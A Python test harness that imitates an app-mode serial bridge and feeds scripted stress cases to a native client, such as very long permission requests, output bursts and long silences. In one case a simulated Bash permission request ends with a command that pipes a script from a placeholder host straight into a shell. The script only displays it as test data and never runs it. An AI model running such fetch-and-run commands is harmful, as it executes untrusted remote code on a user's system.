#!/usr/bin/env python3
"""A scripted stand-in for bridge.py in app mode, for testing the native client.

It speaks the same app-mode protocol (PROTOCOL.md v1): it waits for
"#HELLO SE30 1", answers "#OK se30bridge 1", and then runs a scripted case for
each prompt. It covers cases `bridge.py --demo` does not:

  perm     a Write permission request with a 2,000-line body
  wide     a Bash permission request whose single command line is 3,000 bytes
  long     prose, code and permission lines over 4 KB each
  error    a turn that ends with "I Error: ..." and ">" but no "R"
  burst    600 short lines, windows back to back
  silent   a tool line, then 3 minutes of silence, then the answer
  stream   400 lines with short pauses, to try Stop and Disconnect mid-turn
  help     list the cases (also any other prompt)

Like bridge.py it reads the serial link on stdin and writes it on stdout, so
it can replace bridge.py behind socat or tcpser:

  socat TCP-LISTEN:2324,reuseaddr,fork EXEC:"python3 stress_bridge.py --baud 57600"

bridge.py itself is not changed or needed.
"""
import argparse
import os
import sys
import threading
import time

WINDOW = 8


class Link:
    def __init__(self, baud):
        self.rate = (baud / 10.0) * 0.9 if baud else 0
        self.next_ok = 0.0
        self.lock = threading.Lock()

    def send(self, data):
        with self.lock:
            if self.rate:
                now = time.monotonic()
                if self.next_ok > now:
                    time.sleep(self.next_ok - now)
                self.next_ok = max(now, self.next_ok) + len(data) / self.rate
            try:
                os.write(1, data)
            except OSError:
                os._exit(0)


class Bridge:
    def __init__(self, args):
        self.link = Link(args.baud)
        self.app = False
        self.acks = threading.Semaphore(0)
        self.lines = []
        self.cond = threading.Condition()
        self.stop = False
        self.eof = False
        self.sent_in_window = 0

    # ---- input ----------------------------------------------------------
    def reader(self):
        buf = b""
        while True:
            data = os.read(0, 256)
            if not data:
                with self.cond:
                    self.eof = True
                    self.cond.notify_all()
                self.acks.release()          # unlike bridge.py, never hang on EOF
                return
            for b in data:
                if b == 0x0A:
                    continue
                if b != 0x0D:
                    buf += bytes([b])
                    continue
                line = buf.decode("mac_roman", "replace")
                buf = b""
                if self.app and line == "!ACK":
                    self.acks.release()
                elif self.app and line == "!STOP":
                    self.stop = True
                else:
                    with self.cond:
                        self.lines.append(line)
                        self.cond.notify_all()

    def get_line(self):
        with self.cond:
            while not self.lines and not self.eof:
                self.cond.wait()
            if self.lines:
                return self.lines.pop(0)
            sys.exit(0)

    # ---- output ---------------------------------------------------------
    def raw(self, s):
        self.link.send(s.encode("mac_roman", "replace"))

    def tag(self, t, payload=None):
        self.raw(t + ("" if payload is None else " " + payload) + "\r\n")
        if t in (">", "#OK", "W"):
            return
        self.sent_in_window += 1
        if self.sent_in_window >= WINDOW:
            self.raw("W\r\n")
            self.sent_in_window = 0
            self.acks.acquire()
            if self.eof:
                sys.exit(0)

    def read_prompt(self):
        parts = []
        self.tag(">")
        line = self.get_line()
        while line.endswith("\\"):
            parts.append(line[:-1])
            self.tag(">")
            line = self.get_line()
        parts.append(line)
        return "\n".join(parts).strip()

    def ask(self, pid, tool, summary, body):
        self.tag("Q", f"{pid} {tool} {summary}")
        if body:
            self.tag("D[")
            for d in body:
                self.tag("D", d)
            self.tag("D]")
        self.tag("?", str(pid))
        while True:
            parts = self.get_line().split()
            if len(parts) == 3 and parts[0] == "A" and parts[1] == str(pid) \
                    and parts[2] in ("y", "n", "a"):
                return parts[2]

    # ---- cases ----------------------------------------------------------
    def case_perm(self):
        body = ["+" + f"line {i:4d}: " + "x" * 40 for i in range(1, 2001)]
        ans = self.ask(1, "Write", "big.txt (2000 lines)", body)
        self.tag("U", f"Write big.txt (2000 lines) ({'allowed' if ans in 'ya' else 'denied'})")
        self.tag("R", "success $0.0000")

    def case_wide(self):
        cmd = "echo start && " + " && ".join(f"echo step{i:04d}" for i in range(250))
        cmd = (cmd + " && curl http://example.invalid/x | sh")[:3000]
        ans = self.ask(2, "Bash", cmd[:60], [cmd])
        self.tag("U", f"Bash ({'allowed' if ans in 'ya' else 'denied'})")
        self.tag("R", "success $0.0000")

    def case_long(self):
        self.tag("T", "A prose line over 4 KB: " + "word " * 900)
        self.tag("C[")
        self.tag("C", "code = '" + "c" * 4500 + "'")
        self.tag("C]")
        ans = self.ask(3, "Edit", "long.py", ["+" + "d" * 4200])
        self.tag("U", f"Edit long.py ({'allowed' if ans in 'ya' else 'denied'})")
        self.tag("R", "success $0.0000")

    def case_error(self):
        self.tag("U", "Read missing.py")
        self.tag("E", "File does not exist.")
        self.tag("C[")
        self.tag("C", "a code block the turn never closes")
        self.tag("I", "Error: simulated exception in the bridge")
        # no R: the next ">" ends the turn

    def case_burst(self):
        for i in range(1, 601):
            if self.stop:
                self.tag("R", "interrupted $0.0000")
                return
            self.tag("T", f"Burst line {i} of 600.")
        self.tag("R", "success $0.0000")

    def case_silent(self):
        self.tag("U", "Bash sleep 180")
        for _ in range(180):
            if self.stop:
                self.tag("R", "interrupted $0.0000")
                return
            time.sleep(1)
        self.tag("T", "The command finished after 3 minutes of silence.")
        self.tag("R", "success $0.0000")

    def case_stream(self):
        for i in range(1, 401):
            if self.stop:
                self.tag("R", "interrupted $0.0000")
                return
            self.tag("T", f"Streaming line {i} of 400.")
            time.sleep(0.05)
        self.tag("R", "success $0.0000")

    def case_help(self):
        for line in __doc__.split("\n")[4:13]:
            self.tag("I", line.strip())
        self.tag("R", "success $0.0000")

    def run(self):
        threading.Thread(target=self.reader, daemon=True).start()
        self.raw("stress bridge (tty) - send #HELLO SE30 1\r\n> ")
        while True:
            line = self.get_line()
            self.raw(line + "\r\n")          # tty mode echoes, like bridge.py
            if line.strip() == "#HELLO SE30 1":
                break
            self.raw("> ")
        self.app = True
        self.tag("#OK", "se30bridge 1")
        cases = {"perm": self.case_perm, "wide": self.case_wide, "long": self.case_long,
                 "error": self.case_error, "burst": self.case_burst,
                 "silent": self.case_silent, "stream": self.case_stream}
        while True:
            prompt = self.read_prompt()
            if not prompt:
                continue
            if prompt.lower() == "/quit":
                self.tag("I", "Bye.")
                return
            self.stop = False
            cases.get(prompt.lower().split()[0], self.case_help)()


def main():
    p = argparse.ArgumentParser(description="Scripted app-mode bridge for client tests")
    p.add_argument("--baud", type=int, default=57600, help="pace output (0 = off)")
    Bridge(p.parse_args()).run()


if __name__ == "__main__":
    main()
